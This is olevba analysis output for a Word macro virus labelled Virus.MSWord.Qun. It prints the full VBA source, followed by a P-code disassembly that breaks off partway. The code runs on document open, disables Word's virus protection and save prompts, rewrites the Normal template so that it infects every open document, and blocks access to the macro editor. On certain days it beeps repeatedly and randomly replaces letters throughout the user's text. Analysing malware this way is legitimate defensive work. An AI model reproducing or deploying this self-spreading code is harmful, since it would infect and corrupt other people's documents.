olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Qun
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Qun - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulee.bas 
in file: Virus.MSWord.Qun - OLE stream: 'Macros/VBA/Modulee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Hi()
'<ThE YoUnG HaCkErZ>
MsgBox ("ViReX iNi dItUjUhkAn kHaS bUaT kEkAsiH kU JuN...")
End Sub
Sub AutoOpen()
AutoExec
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
    WordBasic.DisableAutoMacros True
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
If MacroContainer <> NormalTemplate Then
  First
End If
If Documents.Count <> 0 Then
    For i = 1 To Documents.Count
    If Documents(i).NAME <> ActiveDocument.NAME Then
    Set ThisDoc = Documents(i)
    FlyMe ThisDoc
    End If
    Next
End If
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    WordBasic.DisableAutoMacros False
End Sub
Sub First()
On Error Resume Next
Dim NTMac As Object
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
For Each NTMac In NormalTemplate.VBProject.VBComponents
    If NTMac.NAME <> "ThisDocument" Then
         Application.OrganizerDelete NormalTemplate.FullName, NTMac.NAME, 3
    End If
Next NTMac
With NT.CodeModule
If .Lines(2, 1) <> "'<ThE YoUnG HaCkErZ>" Then
  .DeleteLines 1, .CountOfLines
  CallMyMother
 ' MsgBox ("ClenNT, World")
  GetNT
End If
End With
End Sub
Sub GetNT()
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set AD = ActiveDocument.VBProject.VBComponents.Item(2)
TotalLine = AD.CodeModule.CountOfLines
StartLine = TotalLine - 166
ScanNT = AD.CodeModule.Lines(StartLine, TotalLine)
AddToRecentFiles = False
'NTCode = "C:\~config.tmp"
'Open NTCode For Output As #1
'Print #1, "Sub Document_Open()"
'Close #1
'Open NTCode For Append As #1
'Print #1, ScanNT
'Close #1
NT.InsertLines 1, ScanNT
NT.ReplaceLine 1, "Sub AutoOpen()"
NT.ReplaceLine 21, "Sub FileOpen()"
'Kill NTCode
NormalTemplate.Save
End Sub
Sub CallMyMother()
Father = ActiveDocument.FullName
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
Application.DisplayRecentFiles = False
With Documents.Add
NewTemplate = True
.SaveAs FileName:=Mother, FileFormat:=wdFormatTemplate
        Application.OrganizerCopy Source:=Father, _
        Destination:=Mother, NAME:="Modulee", Object:=wdOrganizerObjectProjectItems
        Application.StatusBar = "Copying tHe YoUnG MeLLiNiUm HaCkErZ From " + ActiveDocument.NAME + _
" to mY New mOtHeR..."
.Save
.Close
End With
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
End Sub
'*******************
'*******************
Sub AttcheToMother()
'<ThE YoUnG HaCkErZ>
On Error Resume Next
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
ChGCaP
    WordBasic.DisableAutoMacros True
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    For i = 1 To Documents.Count
    If Documents(i).NAME = ActiveDocument.NAME Then
    Set ThisDoc = Documents(i)
    Second ThisDoc
    End If
    Next
ShowMessage
    WordBasic.DisableAutoMacros False
ReSCaP
'wHeRe EvEr tHe FeAr mAy bE...LoOk iT iN tHe eYe...ThE PoWeR oF ViReX 2000
End Sub
Sub Back2Normal()
'<ThE YoUnG HaCkErZ>
If Dialogs(80).Show <> 0 Then
  AutoOpen
End If
'tHis sPeaCiL ViReX iS DeSiGn tO U
'bY ThE YoUnG HaCkErZ OrG.
End Sub
Sub FlyMe(ThisAD)
On Error Resume Next
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
OriNormal = NormalTemplate.FullName
Set ThisDoc = ThisAD.VBProject.VBComponents.Item(2).CodeModule
With ThisDoc
  If .Lines(2, 1) <> "'<ThE YoUnG HaCkErZ>" Then
     ChGCaP
     With ThisAD
        .UpdateStylesOnOpen = False
        .AttachedTemplate = Mother
     End With
      Application.OrganizerCopy Source:=Mother, _
      Destination:=ThisAD, NAME:="Modulee", Object:=wdOrganizerObjectProjectItems
      'Application.DisplayRecentFiles = True
      Application.StatusBar = "Copying tHe YoUnG MeLLiNiUm HaCkErZ From " + ActiveDocument.NAME + _
      " to mY New cHiLd..."
    '  MsgBox ("Hi, World")
      With ThisAD
        .UpdateStylesOnOpen = False
        .AttachedTemplate = OriNormal
     End With
     ReSCaP
  End If
  ThisAD.Save
End With
'Application.OnTime Now + TimeValue("00:00:02"), "Module1.Hi"
 End Sub
Sub Second(ThisDoc)
On Error Resume Next
Dim ADMac As Object
Set AD = ThisDoc.VBProject.VBComponents.Item(1)
With ThisDoc.VBProject.VBComponents.Item(1).CodeModule
If .Lines(1, 1) <> "" Then
 ' MsgBox ("ClenAD, World")
  .DeleteLines 1, .CountOfLines
End If
End With
For Each ADMac In ThisDoc.VBProject.VBComponents
    If ADMac.NAME <> "ThisDocument" And _
    ADMac.NAME <> "Modulee" Then
         Application.OrganizerDelete ThisDoc.FullName, ADMac.NAME, 3
    End If
Next ADMac
FlyMe ThisDoc
End Sub
'*******************
Sub ToolsMacro()
    H = MsgBox("You can't create or modify macros.", vbExclamation + vbOKOnly)
End Sub
Sub ViewVBCode()
    ToolsMacro
End Sub
Sub FileTemplates()
    ToolsMacro
End Sub
Sub HelpAbout()
    H = MsgBox("Qun katawon walataqun kalaler." & Chr(13) & Chr(13) & _
    "I LOVE SOMETHING ERROR !", vbOKOnly + vbExclamation, "tHe YoUnG MeLLiNiUm HaCkErZ")
    OpenMyMacro
End Sub
Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
End Sub
Sub ChGCaP()
    On Error Resume Next
    Application.Caption = "tHe YoUnG MeLLiNiUm HaCkErZ is now activating "
    ActiveWindow.Caption = "(i DoN't mEaN tO diStuRb, bUt i LuV iT)"
End Sub
Sub ReSCaP()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.NAME
End Sub
Sub OpenMyMacro()
    If InputBox("Enter password", "tHe YoUnG MeLLiNiUm HaCkErZ") = "vj" Then Application.ShowVisualBasicEditor = True
End Sub
Sub ShowMessage()
Dim NAME As String
Dim NewName As String
Dim MyName(7) As String
Dim FindTheName(10) As String
Dim Error As ErrObject
NAME = "a1Ab2Bc3Cd4De5Ef6Fg7Gh8Hi9Ij0Jk~Kl!LmMnNo$OpPq^Qr&RsStTuUv_VwWxXyYzZ"
 H = Time
 If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For g = 1 To 9000
        Beep
    Next g
    H = MsgBox("Terimakasih buat dosenku yang amat sangat " & Chr(34) & _
    "bijaksana" & Chr(34) & "," & Chr(13) & "yang telah memberiku nilai JELEK. Saya merasa bangga " & Chr(13) & _
    "dan sungguh-sungguh bangga terhadap dosenku itu." & Chr(13) & _
    "Sekali lagi saya ucapkan terimakasih!." & Chr(13) & Chr(13) & "Semoga mereka tetap di STIKI." & _
    Chr(13) & "(buat teman-teman, ma'af mengganggu.)", vbOKOnly + vbExclamation, "Ucapan Terimakasih")
 '*******************
'***********************
For x = 1 To 29
'***********************
Dim NewHos As Object
On Error Resume Next
Again:
'ReplaceWith
NewName = ""
For i = 1 To 1
GenNewNo = Int(69 * Rnd + 1)
MyName(i) = Mid(NAME, GenNewNo, 1)
NewName = MyName(i)
Next i
ChGThiS = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz"
'FindAnDReplaceiT
FindName = ""
For y = 1 To 1
FindOldName = Int(52 * Rnd + 1)
FindTheName(b) = Mid(ChGThiS, FindOldName, 1)
Next y
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = FindTheName(b)
        .Replacement.Text = NewName
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
Next x
 End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Qun
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Modulee - 14547 bytes
' Line #0:
' 	FuncDefn (Sub Hi())
' Line #1:
' 	QuoteRem 0x0000 0x0013 "<ThE YoUnG HaCkErZ>"
' Line #2:
' 	LitStr 0x0030 "ViReX iNi dItUjUhkAn kHaS bUaT kEkAsiH kU JuN..."
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Sub AutoOpen())
' Line #5:
' 	ArgsCall AutoExec 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Sub AutoExec())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	ArgsCall First 0x0000 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #19:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #20:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set ThisDoc 
' Line #21:
' 	Ld ThisDoc 
' 	ArgsCall FlyMe 0x0001 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	StartForVariable 
' 	Next 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub First())
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	Dim 
' 	VarDefn NTMac (As Object)
' Line #33:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0009 "\~tmp.dot"
' 	Concat 
' 	St Mother 
' Line #34:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #35:
' 	StartForVariable 
' 	Ld NTMac 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #36:
' 	Ld NTMac 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #37:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld NTMac 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld NTMac 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	StartWithExpr 
' 	Ld NT 
' 	MemLd CodeModule 
' 	With 
' Line #41:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0014 "'<ThE YoUnG HaCkErZ>"
' 	Ne 
' 	IfBlock 
' Line #42:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #43:
' 	ArgsCall CallMyMother 0x0000 
' Line #44:
' 	QuoteRem 0x0001 0x0019 " MsgBox ("ClenNT, World")"
' Line #45:
' 	ArgsCall GetNT 0x0000 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndWith 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub GetNT())
' Line #50:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #52:
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St TotalLine 
' Line #53:
' 	Ld TotalLine 
' 	LitDI2 0x00A6 
' 	Sub 
' 	St StartLine 
' Line #54:
' 	Ld StartLine 
' 	Ld TotalLine 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ScanNT 
' Line #55:
' 	LitVarSpecial (False)
' 	St AddToRecentFiles 
' Line #56:
' 	QuoteRem 0x0000 0x0019 "NTCode = "C:\~config.tmp""
' Line #57:
' 	QuoteRem 0x0000 0x001C "Open NTCode For Output As #1"
' Line #58:
' 	QuoteRem 0x0000 0x001F "Print #1, "Sub Document_Open()""
' Line #59:
' 	QuoteRem 0x0000 0x0008 "Close #1"
' Line #60:
' 	QuoteRem 0x0000 0x001C "Open NTCode For Append As #1"
' Line #61:
' 	QuoteRem 0x0000 0x0010 "Print #1, ScanNT"
' Line #62:
' 	QuoteRem 0x0000 0x0008 "Close #1"
' Line #63:
' 	LitDI2 0x0001 
' 	Ld ScanNT 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #65:
' 	LitDI2 0x0015 
' 	LitStr 0x000E "Sub FileOpen()"
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #66:
' 	QuoteRem 0x0000 0x000B "Kill NTCode"
' Line #67:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub CallMyMother())
' Line #70:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Father 
' Line #71:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0009 "\~tmp.dot"
' 	Concat 
' 	St Mother 
' Line #72:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #73:
' 	StartWithExpr 
' 	Ld Documents 
' 	MemLd Add 
' 	With 
' Line #74:
' 	LitVarSpecial (True)
' 	St NewTemplate 
' Line #75:
' 	Ld Mother 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	ArgsMemCallWith SaveAs 0x0002 
' Line #76:
' 	LineCont 0x0004 07 00 08 00
' 	Ld Father 
' 	ParamNamed Source 
' 	Ld Mother 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Modulee"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #77:
' 	LineCont 0x0004 0A 00 00 00
' 	LitStr 0x0029 "Copying tHe YoUnG MeLLiNiUm HaCkErZ From "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0014 " to mY New mOtHeR..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #78:
' 	ArgsMemCallWith Save 0x0000 
' Line #79:
' 	ArgsMemCallWith Close 0x0000 
' Line #80:
' 	EndWith 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #82:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #83:
' 	EndSub 
' Line #84:
' 	QuoteRem 0x0000 0x0013 "*******************"
' Line #85:
' 	QuoteRem 0x0000 0x0013 "*******************"
' Line #86:
' 	FuncDefn (Sub AttcheToMother())
' Line #87:
' 	QuoteRem 0x0000 0x0013 "<ThE YoUnG HaCkErZ>"
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0009 "\~tmp.dot"
' 	Concat 
' 	St Mother 
' Line #90:
' 	ArgsCall ChGCaP 0x0000 
' Line #91:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #92:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #93:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #94:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #96:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Eq 
' 	IfBlock 
' Line #97:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set ThisDoc 
' Line #98:
' 	Ld ThisDoc 
' 	ArgsCall Second 0x0001 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	StartForVariable 
' 	Next 
' Line #101:
' 	ArgsCall ShowMessage 0x0000 
' Line #102:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #103:
' 	ArgsCall ReSCaP 0x0000 
' Line #104:
' 	QuoteRem 0x0000 0x0049 "wHeRe EvEr tHe FeAr mAy bE...LoOk iT iN tHe eYe...ThE PoWeR oF ViReX 2000"
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub Back2Normal())
' Line #107:
' 	QuoteRem 0x0000 0x0013 "<ThE YoUnG HaCkErZ>"
' Line #108:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #109:
' 	ArgsCall AutoOpen 0x0000 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	QuoteRem 0x0000 0x0021 "tHis sPeaCiL ViReX iS DeSiGn tO U"
' Line #112:
' 	QuoteRem 0x0000 0x0019 "bY ThE YoUnG HaCkErZ OrG."
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub FlyMe(ThisAD))
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0009 "\~tmp.dot"
' 	Concat 
' 	St Mother 
' Line #117:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St OriNormal 
' Line #118:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld ThisAD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ThisDoc 
' Line #119:
' 	StartWithExpr 
' 	Ld ThisDoc 
' 	With 
' Line #120:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0014 "'<ThE YoUnG HaCkErZ>"
' 	Ne 
' 	IfBlock 
' Line #121:
' 	ArgsCall ChGCaP 0x0000 
' Line #122:
' 	StartWithExpr 
' 	Ld ThisAD 
' 	With 
' Line #123:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #124:
' 	Ld Mother 
' 	MemStWith AttachedTemplate 
' Line #125:
' 	EndWith 
' Line #126:
' 	LineCont 0x0004 07 00 06 00
' 	Ld Mother 
' 	ParamNamed Source 
' 	Ld ThisAD 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Modulee"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #127:
' 	QuoteRem 0x0006 0x0025 "Application.DisplayRecentFiles = True"
' Line #128:
' 	LineCont 0x0004 0A 00 06 00
' 	LitStr 0x0029 "Copying tHe YoUnG MeLLiNiUm HaCkErZ From "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0013 " to mY New cHiLd..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #129:
' 	QuoteRem 0x0004 0x0016 "  MsgBox ("Hi, World")"
' Line #130:
' 	StartWithExpr 
' 	Ld ThisAD 
' 	With 
' Line #131:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #132:
' 	Ld OriNormal 
' 	MemStWith AttachedTemplate 
' Line #133:
' 	EndWith 
' Line #134:
' 	ArgsCall ReSCaP 0x0000 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	Ld ThisAD 
' 	ArgsMemCall Save 0x0000 
' Line #137:
' 	EndWith 
' Line #138:
' 	QuoteRem 0x0000 0x003C "Application.OnTime Now + TimeValue("00:00:02"), "Module1.Hi""
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub Second(ThisDoc))
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	Dim 
' 	VarDefn ADMac (As Object)
' Line #143:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #144:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ThisDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #145:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #146:
' 	QuoteRem 0x0001 0x0019 " MsgBox ("ClenAD, World")"
' Line #147:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndWith 
' Line #150:
' 	StartForVariable 
' 	Ld ADMac 
' 	EndForVariable 
' 	Ld ThisDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #151:
' 	LineCont 0x0004 07 00 04 00
' 	Ld ADMac 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld ADMac 
' 	MemLd New 
' 	LitStr 0x0007 "Modulee"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #152:
' 	Ld ThisDoc 
' 	MemLd FullName 
' 	Ld ADMac 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	StartForVariable 
' 	Ld ADMac 
' 	EndForVariable 
' 	NextVar 
' Line #155:
' 	Ld ThisDoc 
' 	ArgsCall FlyMe 0x0001 
' Line #156:
' 	EndSub 
' Line #157:
' 	QuoteRem 0x0000 0x0013 "*******************"
' Line #158:
' 	FuncDefn (Sub ToolsMacro())
' Line #159:
' 	LitStr 0x0022 "You can't create or modify macros."
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	St H 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub ViewVBCode())
' Line #162:
' 	ArgsCall ToolsMacro 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub FileTemplates())
' Line #165:
' 	ArgsCall ToolsMacro 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub HelpAbout())
' Line #168:
' 	LineCont 0x0004 10 00 04 00
' 	LitStr 0x001E "Qun katawon walataqun kalaler."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0018 "I LOVE SOMETHING ERROR !"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x001B "tHe YoUnG MeLLiNiUm HaCkErZ"
' 	ArgsLd MsgBox 0x0003 
' 	St H 
' Line #169:
' 	ArgsCall OpenMyMacro 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub ToolsOptions())
' Line #172:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #173:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #174:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #175:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #176:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #177:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #178:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #179:
' 	EndSub 
' Line #180:
' 	FuncDefn (Sub ChGCaP())
' Line #181:
' 	OnError (Resume Next) 
' Line #182:
' 	LitStr 0x002E "tHe YoUnG MeLLiNiUm HaCkErZ is now activating "
' 	Ld Application 
' 	MemSt Caption 
' Line #183:
' 	LitStr 0x0027 "(i DoN't mEaN tO diStuRb, bUt i LuV iT)"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Sub ReSCaP())
' Line #186:
' 	OnError (Resume Next) 
' Line #187:
' 	LitStr 0x000E "Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #188:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #189:
' 	EndSub 
' Line #190:
' 	FuncDefn (Sub OpenMyMacro())
' Line #191:
' 	LitStr 0x000E "Enter password"
' 	LitStr 0x001B "tHe YoUnG MeLLiNiUm HaCkErZ"
' 	ArgsLd InputBox 0x0002 
' 	LitStr 0x0002 "vj"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Sub ShowMessage())
' Line #194:
' 	Dim 
' 	VarDefn New (As String)
' Line #195:
' 	Dim 
' 	VarDefn NewName (As String)
' Line #196:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0007 
' 	VarDefn MyName (As String)
' Line #197:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn FindTheName (As String)
' Line #198:
' 	Dim 
' 	VarDefn Error
' Line #199:
' 	LitStr 0x0044 "a1Ab2Bc3Cd4De5Ef6Fg7Gh8Hi9Ij0Jk~Kl!LmMnNo$OpPq^Qr&RsStTuUv_VwWxXyYzZ"
' 	St New 
' Line #200:
' 	Ld Time 
' 	St H 
' Line #201:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSunday 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Time 
' 	LitStr 0x0008 "21:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #202:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2328 
' 	For 
' Line #203:
